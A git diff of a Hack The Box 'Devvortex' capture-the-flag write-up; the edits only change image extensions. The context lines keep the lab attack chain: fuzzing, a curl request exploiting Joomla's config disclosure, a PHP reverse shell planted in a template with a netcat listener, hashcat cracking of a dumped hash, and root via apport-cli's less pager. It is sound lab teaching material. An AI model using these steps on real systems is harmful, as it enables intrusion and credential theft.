@@ -8,7 +8,7 @@ math: true
 mermaid: true
 author: 7h3h0und
 image:
-  path: /assets/img/headers/devvortex.png
+  path: /assets/img/headers/devvortex.webp
   lqip: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADIklEQVR4nJWVS24rVRCGvzqPftiOQyLgiuiCQLoSO2ALbIEJA5aGmLEMxncGO2BEcqXEjuPuPo8qBm0njpBIUlK3dAZd/ddXf52Si6++N94Q4sAUhntFFfqVo+mh6YQoC7xrADs8/w1VfXYOb/15Ho3YeH74ccW7byKxg7ubyp9/jAz3hf5MURVAkJNvDRCgvlmAgY/C+iKyWnWEGAlNgOy5/TsCUGvh6w89NSu1KNOY2W0KORkixzQHIkdVMud+UYABsYXYOkKMxCawWAfWFw3LRYMZjEPifqvsNoYThwvgoqKjzS0z5pc8Ja1WXkFAAIXQCM4LPjpCH1h/seT8fEnXrDCD2O+xZsOY9mQqFMM3oGbIox3smS1EBHsVAYMQBXHzOcaWzy8v6NszRM9RE0K7JQRhc6OkYQdixChgj6RnCscOyAGIvMGEhlFqpWsbzpc9XdOhJaKAk45sC677PbvNDsThPHgPzp8W/4SgZn0FgYPKWqDkSpK5bw8PA6kmUrmjmtF5I6eMGUy5ME0Zq3MLZgqnzpsTN3428MsEBMpk+KjUOrHdTlxfT6w/a5EgmMB2X7jfTGzuE/thQmuF5B95iwhykHFkENvwSgEYaVJ86xCX2e92fLo2xqHHh3YWWBIPu5HhYaSWiqhQ0rFuQQ3c4zjOUUrFsP8X4JzDudmtmoTYCzUlyhjRpqH3c11aFMuZkkZQI42g2XDe4ZxDRHCnMzhzwewFAW3b0jaREAJt27Bat7QLR2jmOU+6m/EGpV9GzJYEWTCEQkmVqhVTo5b61P5DIx7S9LKA5vDzEALeeYLr0cmoqmSDLIZZRRVqhTx6ggS6plB9IecCBqMO8OiB+VJetC3CKzwwTYlhGDEzUs6Py0ScYTaLCdHjnFCq4sSTUp4rFWhjg8K8wU4i+leYcLPZIgK//PwTd5t7rq7ecXe3petabm/vuLy4oMrA2XnHx49/cbn+kvfvr/jn5hMfvvuWX3/7nTRNxONlcBLH3SAvrWMzw3tPzpmUMjFGSimICFWV5aIj9BUfBM2O/a5gGOvVGeuzFaXWZ+MHJ3ZA+BcNsqz461PEEQAAAABJRU5ErkJggg==
 ---
 
@@ -56,7 +56,7 @@ I stared ffuf to fuzz out any subdomains as below.
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -mc 200
 ```
 
-![img-description](/assets/img/htb/devvortex/1.png) _FUZZING for Subdomains_
+![img-description](/assets/img/htb/devvortex/1.webp) _FUZZING for Subdomains_
 
 Found dev.devvoertex.htb and have added it to my /etc/hosts and proceeded to explore the site.
 
@@ -65,11 +65,11 @@ Meanwhile, I ran ffuf again to see if we have any hidden web content.
 ``` bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.devvortex.htb/FUZZ
 ```
-![img-description](/assets/img/htb/devvortex/2.png) _Reveling hidden web content_
+![img-description](/assets/img/htb/devvortex/2.webp) _Reveling hidden web content_
 
 I went ahead and pivoted to administrator page and notices its using joomla CMS.
 
-![img-description](/assets/img/htb/devvortex/3.png) _Joomla CMS_
+![img-description](/assets/img/htb/devvortex/3.webp) _Joomla CMS_
 
 ### Initial Step:
 
@@ -81,17 +81,17 @@ The Joomla versions 4.0.0 through 4.2.7 are affected with improper access check 
 curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
 ```
 
-![img-description](/assets/img/htb/devvortex/4.png) _exploiting the vulnerablity_
+![img-description](/assets/img/htb/devvortex/4.webp) _exploiting the vulnerablity_
 
 Leveraging the vulnerability, I was able to retrieve the credentials for Joomla Administrator.
 
-![img-description](/assets/img/htb/devvortex/5.png) _Admin Access_
+![img-description](/assets/img/htb/devvortex/5.webp) _Admin Access_
 
 I know that we can modify PHP templates in such CMS and can gain reverse shell. Lets try !
 
 So, I went ahead to `System -> Templates -> Administrator Templates -> Atum -> login.php` and added my payload and saved the template.
 
-![img-description](/assets/img/htb/devvortex/6.png) _PHP reverse shell_
+![img-description](/assets/img/htb/devvortex/6.webp) _PHP reverse shell_
 
 Payload used for reverse shell.
 ```bash
@@ -103,7 +103,7 @@ Stared netcat listener on my host machine and browsed to login.php
 nc -lvnp 4444
 ```
 
-![img-description](/assets/img/htb/devvortex/7.png) _PHP reverse shell_
+![img-description](/assets/img/htb/devvortex/7.webp) _PHP reverse shell_
 
 I received the shell but seems like needing to stabalize it.
 
@@ -132,14 +132,14 @@ mysql -u lewis -p
 
 Reviewing the database `joomla` I was able to retrive the user credential user logan from table `sd4fg_users`
 
-![img-description](/assets/img/htb/devvortex/8.png) _Db user table dump_
+![img-description](/assets/img/htb/devvortex/8.webp) _Db user table dump_
 
 The password is hashed with 'bcrypt' hashing mechanism, so I went ahead and saved hash in a text file and ran `hashcat`.
 
 ```bash
 hashcat -m 3200 -a 0 hash.txt /usr/share/worlist/rockyou.txt
 ```
-![img-description](/assets/img/htb/devvortex/9.png) _hashcat_
+![img-description](/assets/img/htb/devvortex/9.webp) _hashcat_
 
 The password was cracked in an instant, so I SSHed into the box with the cracked credentials.
 
@@ -155,7 +155,7 @@ sudo -l
 
 With which, I learned  that I (now the user) can run `apport-cli`  with root privileges.
 
-![img-description](/assets/img/htb/devvortex/10.png) _approt-cli_
+![img-description](/assets/img/htb/devvortex/10.webp) _approt-cli_
 
 I simply googled to get more understanding and found out privilege escalation vulnerability [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC) in apport-cli, that could alow me to pivot to root.
 
@@ -266,14 +266,14 @@ What would you like to do? Your options are:
 Please choose (S/V/K/I/C): v
 ```
 
-![img-description](/assets/img/htb/devvortex/11.png) _exploiting the vulnerability_
+![img-description](/assets/img/htb/devvortex/11.webp) _exploiting the vulnerability_
 
 > `Vulnerability`: Less is configured as the pager in apport-cli allowing us to set: the terminal size.
 {: .prompt-info }
 
 Once I hit the enter key after typing the command `!/bin/bash` the pager closed leaving a escalated shell to root. 
 
-![img-description](/assets/img/htb/devvortex/12.png) _whoami - Root!_
+![img-description](/assets/img/htb/devvortex/12.webp) _whoami - Root!_
 
 We have the machine `ROOTED!`  
 
